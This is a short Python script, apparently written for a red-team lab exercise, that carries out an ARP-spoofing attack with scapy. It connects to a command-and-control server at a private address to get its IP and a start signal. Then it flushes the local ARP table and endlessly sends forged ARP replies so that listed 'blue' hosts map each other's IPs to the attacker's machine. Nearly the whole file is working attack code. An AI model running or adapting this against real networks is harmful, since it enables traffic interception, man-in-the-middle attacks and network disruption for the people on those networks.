from scapy.all import *
import socket
import os

# C2 Ip and port
C2_IP = "192.168.194.35"
PORT = 6432

# C2 Will send over the ip address for the node the script is running on
# Note: the traditional method for getting the ip address in python did not work on these VMs, which I why I am getting the ip address in this way.
MY_IP = ""

# Mapping of Ips -> Macs of all blue nodes on the network
IPS_MACS = {
        "192.168.192.121": "00:50:56:b0:85:fc",
        "192.168.194.82": "00:50:56:b0:e5:31",
        "192.168.194.35": "00:50:56:b0:f1:6b",
        }

#Wait for C2 signal
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((C2_IP, PORT))
    MY_IP = s.recv(1024)

# Clear arp table
os.system("ip -s -s neigh flush all")

# Begin the attack ( spam false arp replies for arp requests of other ips)
while True:
    for ipdst, macdst in IPS_MACS.items():

        #Dont send ARP replies for ARP requests from my own IP, doesn't make sense
        if ipdst == MY_IP:
            continue

        for ipsrc in IPS_MACS.keys():

            # Blast out false claims of what my ip is, except for my actual ip
            if ipsrc == MY_IP:
                continue

            # Don't send ARP replies with ipsrc and ipdst same
            if ipsrc == ipdst:
                continue

            # Send ARP reply
            packet = ARP(op=2, pdst=ipdst, hwdst=macdst, psrc=ipsrc)
            send(packet, verbose=True)
